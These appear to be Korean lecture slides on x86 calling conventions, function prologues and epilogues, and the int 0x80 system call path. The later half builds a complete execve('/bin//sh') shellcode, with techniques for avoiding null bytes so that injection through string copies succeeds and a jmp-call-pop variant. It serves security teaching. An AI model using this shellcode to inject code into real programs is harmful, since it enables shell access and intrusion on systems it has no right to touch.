함수 프롤로그 & 호출 분석 <1>–<8>

<1> push %ebp — 최초 ebp 저장

  • 최초의 ebp 값을 스택에 저장한다.
  • ebp 바로 전(상위)에는 ret(return address)가 저장되어 있다. 함수 종료 시 점프할 주소인 이전 eip 값이다.
  • ebp는 함수 시작 전의 기준점(base pointer)이 된다.
스택은 상위 주소(0xFFFFFFFF)에서 하위 주소(0x0) 방향으로 증가한다. push 시 esp가 감소한다.
push %ebp 직후의 스택
slide 27

<2> mov %esp, %ebp — 프롤로그 완성

  • 현재의 esp 값을 ebp 레지스터에 저장한다.
  • push %ebp + mov %esp,%ebp는 새 함수를 시작할 때마다 항상 수행하는 명령으로, 프롤로그(Prologue)라 부른다.
  • 이 시점에 ebp == esp 가 되어 둘이 같은 위치를 가리킨다.
ebp = esp (프롤로그 완료)
slide 28

<3> sub $0x4, %esp — 지역변수 c 할당

  • 스택에 4(=0x4)바이트를 할당한다.
  • main의 지역변수 int c (4바이트)를 위한 공간이다.
  • esp가 4바이트 감소(하위 방향 이동)한다. ebp는 그대로 기준점을 유지한다.
int c 공간 확보
slide 29

<4> push $0x2  /  <5> push $0x1 — 인자 전달

  • <4>~<6>은 function(1, 2) 호출 루틴이다.
  • cdecl 규약상 인자는 오른쪽부터 push → 2를 먼저, 1을 나중에 push한다.
  • 스택 상단(낮은 주소)에 1, 그 위에 2가 쌓인다.
인자 1, 2 push 완료
slide 30

<6> call 0x565561b5 <function> — 함수 호출

  • call은 내부적으로 push %eip + jmp 대상주소를 의미한다.
  • 즉, 현재 %eip값 (다음 명령 주소 0x565561ac)을 push하고, %eip를 0x565561b5로 변경한다.
  • push된 0x565561ac가 function의 return address가 된다.
return address가 push됨
slide 31

<7> push %ebp  /  <8> mov %esp,%ebp — function의 프롤로그

  • <7>: 현재 레지스터의 ebp 값(= main 함수의 ebp)을 스택에 저장한다. 이로써 호출 체인이 연결된다.
  • <8>: function(1,2)의 프롤로그. esp를 ebp에 복사하여 새 함수의 기준점을 세운다.
  • 이제 ebp를 기준으로 0x8(%ebp)=인자1, 0xc(%ebp)=인자2로 접근 가능하다.
function 프롤로그 후 (ebp=esp)
slide 32–33
04

함수 본문 & 에필로그 분석 <9>–<18>

<9> sub $0xc, %esp — char buffer[10] 할당

  • char buffer[10]을 위한 공간 할당.
  • 실질적으로 10바이트만 필요하지만, 4-byte alignment에 의해 12(=0xc)바이트가 할당된다.
핵심: 선언한 크기(10)와 실제 할당 크기(12)가 다를 수 있다 — 정렬 때문.
buffer 12바이트 할당
slide 34

<10> mov 0xc(%ebp), %eax — 인자 b 로드

  • ebp에 12(0xc)바이트를 더한 주소의 값(=2, 즉 인자 b)을 eax에 복사한다.
  • a=a+b 계산을 위해 b를 먼저 레지스터로 가져온다.
eax ← 2 (인자 b)
slide 35

<11> add %eax, 0x8(%ebp) — a = a + b

  • ebp에 8바이트를 더한 주소의 값(=1, 인자 a)에 eax(=2)를 더한다.
  • 결과: 0x8(%ebp) 위치가 1 + 2 = 3이 된다.
  • 즉 메모리상의 인자 a가 직접 갱신된다 (eax는 2 유지).
a(1) += eax(2) → 3
slide 36

<12> mov 0x8(%ebp), %eax — 반환값 준비

  • ebp+8 주소의 값(=3)을 eax에 저장한다.
  • x86 cdecl에서 함수 반환값은 eax에 담긴다. 따라서 return a;를 위해 결과 3을 eax에 적재한다.
eax ← 3 (반환값)
slide 37

<13> leave  /  <14> ret — function 에필로그

  • <13> leave: main 함수의 원래 ebp 값으로 복귀하고 함수를 끝낸다. mov %ebp,%esp + pop %ebp를 의미한다.
  • <14> ret: function을 마치고 스택을 정리한다. pop %eip를 의미 → 스택에 저장된 function ret(0x565561ac)로 복귀한다.
leave = mov %ebp,%esp ; pop %ebp  |  ret = pop %eip — 이 두 쌍이 에필로그의 전부다.
slide 38

<15>–<18> main으로 복귀 후 마무리

  • <15> add $0x8, %esp: esp에 8바이트를 더한다 → 전달했던 인자 2개(1, 2)를 정리(caller가 인자 제거).
  • <16> mov %eax, -0x4(%ebp): ebp에서 4바이트를 뺀 주소(지역변수 int c)에 eax 값(3)을 복사 → c = function(1,2) 완료.
  • <17> leave: main 함수를 끝낸다.
  • <18> ret: main을 마치고 스택을 정리한다.
여기까지가 "System Call Execution"으로 넘어가기 전, 일반 함수의 완전한 생명주기(프롤로그 → 본문 → 에필로그)이다.

시스템 콜 처리 과정

시스템 콜 호출 예제 User ↔ Kernel

사용자 프로그램은 표준 C 라이브러리를 통해 실제 수행하는 커널 함수를 호출한다. 예: pid = fork();

User mode → libc → System Call → Kernel mode
slide 40

시스템 콜 처리 과정 단계 libc.a → system_call()

① 사용자 프로세스 → libc.a

  • 인자(argument)를 스택에 넣음
  • 시스템 콜 번호를 (eax에) 저장
  • Trap (= S/W Interrupt, int 0x80) 발생을 통해 IDT 호출

② system_call()

  • IDT에 의해 인터럽트 시작
  • sys_call_table 사용 (eax 번호로 핸들러 인덱싱)
  • 해당 핸들러 실행

③ 시스템 콜 핸들러 함수

  • 시스템 콜 핸들러 함수는 약 440개까지 가능 (커널 5.15 기준)
slide 41

fork 시스템 콜 처리 흐름 int 0x80

전체 흐름을 한눈에: fork() → libc가 eax에 2(=__NR_fork) 저장 + int $0x80 → IDT[0x80] = system_call() → sys_call_table[2] = sys_fork() → /kernel/fork.c 실행.

fork() → int 0x80 → IDT[0x80] → sys_call_table[2] → sys_fork()

Shellcode 개념

Shellcode란? code injection

  • 코드 인젝션 공격에서는 바이너리 코드를 주입해야 한다.
  • Shellcode는 주입 코드로 가장 흔히 선택되는 코드다.
  • 목표: 쉘(shell)을 얻는 것. 쉘을 얻고 나면 임의의 명령을 실행할 수 있다.
  • 어셈블리 코드로 작성한다.
slide 46

C로 표현한 Shellcode의 논리 shellcode.c

쉘코드가 궁극적으로 하려는 일은 아래 C 코드와 같다 — /bin/sh를 execve로 실행.

#include <unistd.h>
void main()
{
    char *argv[2];
    argv[0] = "/bin/sh";
    argv[1] = NULL;
    execve(argv[0], argv, NULL);
}
slide 47

바이너리 코드 획득 — 왜 직접 어셈블리로 짜는가 objdump

C를 컴파일해 바이너리를 뽑으면 아래처럼 문제가 되는 바이트가 섞인다.

$ gcc -m32 shellcode.c
$ objdump -Mintel --disassemble a.out
000011ed <main>:
 11ed: f3 0f 1e fb              endbr32
 11f1: 8d 4c 24 04              lea ecx,[esp+0x4]
 ...
 1203: e8 54 00 00 00        call 125c <__x86.get_pc_thunk.ax>
 1208: 05 cc 2d 00 00        add eax,0x2dcc
 120d: 65 8b 1d 14 00 00 00  mov ebx,DWORD PTR gs:0x14
 1238: e8 63 fe ff ff          call 10a0 <execve@plt>
컴파일 결과에는 00(NULL) 바이트가 다수 포함되고, execve@plt처럼 라이브러리/로더에 의존하는 호출이 들어간다. 그래서 쉘코드는 어셈블리로 직접 작성해 이런 의존성과 NULL을 제거한다.

어셈블리로 Shellcode 작성

execve("/bin/sh", argv, 0) 호출 규약 레지스터 세팅

int 0x80 방식으로 execve를 부르려면 아래 레지스터를 모두 세팅해야 한다.

레지스터의미
eax0x0b — execve() 시스템 콜 번호
ebx명령 문자열 "/bin/sh"의 주소
ecx인자 배열 argv의 주소
edx환경변수의 주소 (여기서는 0)
코드 안에 zero(NULL 바이트)를 넣을 수 없는 이유는? → 쉘코드는 보통 strcpy 등 문자열 복사로 주입되는데, NULL 바이트가 문자열 종료 문자로 해석되어 그 뒤 코드가 복사되지 않기 때문이다.
slide 49

ebx 세팅 — "/bin//sh" 문자열을 스택에 구성

문자열을 스택에 직접 push해 그 주소를 ebx에 담는다. /bin//sh처럼 //를 쓰는 이유는 8바이트(=4바이트 ×2)로 딱 맞춰 push하기 위함이다 (/bin/sh는 7글자라 정렬이 애매). 추가된 /는 경로상 무시된다.

  • xor eax,eax → eax=0 (NULL 종료용)
  • push eax → 문자열 끝 \0
  • push "//sh", push "/bin"
  • mov ebx,esp → 문자열 시작 주소 획득
xor  eax, eax
push eax
push "//sh"
push "/bin"
mov  ebx, esp
ebx ← esp
slide 50

ecx 세팅 — argv[] 배열 구성

argv 배열은 argv[0]="/bin//sh"의 주소, argv[1]=0 두 원소로 구성한다. 역시 스택에 push하고 그 주소를 ecx에 담는다.

  • push eax → argv[1] = 0
  • push ebx → argv[0] = 문자열 주소
  • mov ecx,esp → argv 배열 주소
push eax        ; argv[1]
push ebx        ; argv[0]
mov  ecx, esp   ; ecx
ecx ← esp (argv)
slide 51

edx 세팅 & execve 호출

edx = 0 (환경변수 없음)

xor edx, edx

eax = 0x0b 세팅 후 int 0x80

xor eax, eax    ; eax = 0x00000000
mov al, 0x0b     ; eax = 0x0000000b  (al = eax 하위 1바이트)
int 0x80
al 트릭: mov eax,0x0b은 기계어가 b8 0b 00 00 00으로 NULL이 생긴다. 대신 eax를 0으로 지운 뒤 mov al,0x0b로 최하위 바이트만 채우면 NULL 없이 동일한 결과를 얻는다.
slide 52–53

전체 조립 (Putting Everything Together)

xor  eax, eax
push eax           ; Use 0 to terminate the string
push "//sh"
push "/bin"
mov  ebx, esp      ; Get the string address

; Construct the argument array argv[]
push eax           ; argv[1] = 0
push ebx           ; argv[0] points "/bin//sh"
mov  ecx, esp      ; Get the address of argv[]

; For environment variable
xor  edx, edx      ; No env variables

; Invoke execve()
xor  eax, eax      ; eax = 0x00000000
mov  al, 0x0b       ; eax = 0x0000000b
int 0x80

How to Avoid Zeros — 핵심 3대 기법

① xor 사용

  • mov eax, 0 → 기계어에 zero 포함 → 나쁨
  • xor eax, eax → 기계어에 zero 없음 → 좋음

② 1바이트 operand 명령 사용

0x00000099를 eax에 넣으려면?

  • mov eax, 0x99 → 실제로는 0x00000099라 NULL 3개 → 나쁨
  • xor eax,eax; mov al,0x99 → al은 eax의 최하위 1바이트 → NULL 없음
slide 59

③ Shift 연산으로 상위 NULL 밀어내기

0x00112233을 ebx에 넣고 싶을 때, 직접 쓰면 상위 바이트 00이 문제가 된다. 대신 최상위를 FF로 채운 값을 넣고 좌/우 shift로 밀어낸다.

  • mov ebx, 0xFF112233 (NULL 없음)
  • shl ebx, 8 → 최상위 FF 제거: 0x11223300
  • shr ebx, 8 → 다시 당김: 0x00112233
mov ebx, 0xFF112233
shl ebx, 8
shr ebx, 8

문자열에도 shift 적용 — "/bin/bash" push (// 기법 없이)

mov  edx, "h***"
shl  edx, 24     ; shift left 24 bits
shr  edx, 24     ; shift right 24 bits
push edx         ; edx now contains h\0\0\0
push "/bas"
push "/bin"
mov  ebx, esp     ; Get the string address

"h***"를 24비트 좌우 shift하면 하위 1바이트 h만 남고 나머지는 \0으로 채워진다 → "/bin/bash\0" 완성.

Generic Shellcode (두 번째 방식)

jmp-call-pop — 문자열/argv 주소 획득 트릭

스택에 문자열을 push하는 대신, 쉘코드 자체에 데이터를 붙여두고 그 주소를 얻는 방식이다. 핵심은 call이 복귀 주소(= 바로 뒤 데이터의 주소)를 스택에 push한다는 점을 이용하는 것.

  • jmp short two → 코드 끝의 two로 점프
  • two: call one → one으로 가면서, 바로 뒤 /bin/sh*의 주소를 스택에 push
  • one: pop ebx → push된 그 주소를 ebx로 꺼냄 → 문자열 주소 확보
_start:
    BITS 32
    jmp short two
one:
    pop ebx       ; <- call이 저장한
                  ;    주소 pop

    .... code omitted ...

two:
    call one      ; 이 아래 주소가
                  ; push됨
    db '/bin/sh*'
    db 'AAAA'
    db 'BBBB'
slide 63

Data Preparation — 문자열 종료 & argv 구성

ebx가 /bin/sh*의 시작 주소를 가리키므로, 오프셋으로 데이터를 가공한다. (/bin/sh*=8바이트, 이어 AAAA(argv[0] 자리, offset 8), BBBB(argv[1] 자리, offset 12))

문자열 끝에 zero 넣기 (* → \0)

xor eax, eax
mov [ebx+7], al   ; '*' 위치(offset 7)를 \0으로

argv 배열 구성

mov [ebx+8],  ebx   ; argv[0] = 문자열 주소
mov [ebx+12], eax   ; argv[1] = 0 (eax=0)
lea ecx, [ebx+8]   ; ecx = ebx + 8 (argv 주소)

이후 edx=0, eax=0x0b, int 0x80으로 execve 호출 (08절과 동일).

slide 64

컴파일 & 테스트 — 쓰기 가능 코드 영역

문제: 코드 영역은 수정 불가 → Segmentation fault

$ nasm -f elf32 -o shellcode_two.o shellcode_two.s
$ ld -m elf_i386 -o shellcode_two shellcode_two.o
$ ./shellcode_two
Segmentation fault

이 방식은 mov [ebx+7], al처럼 코드에 붙은 데이터(=코드 영역)를 수정하기 때문에, 기본적으로 읽기 전용인 코드 영역에서 오류가 난다.

해결: 코드 영역을 쓰기 가능으로 — --omagic

$ nasm -f elf32 -o shellcode_two.o shellcode_two.s
$ ld --omagic -m elf_i386 -o shellcode_two shellcode_two.o
$ ./shellcode_two
$   <-- new shell (성공)
ld --omagic는 text/data를 쓰기 가능한 하나의 세그먼트로 링크하여, 코드 영역 내 데이터 수정이 가능해진다.
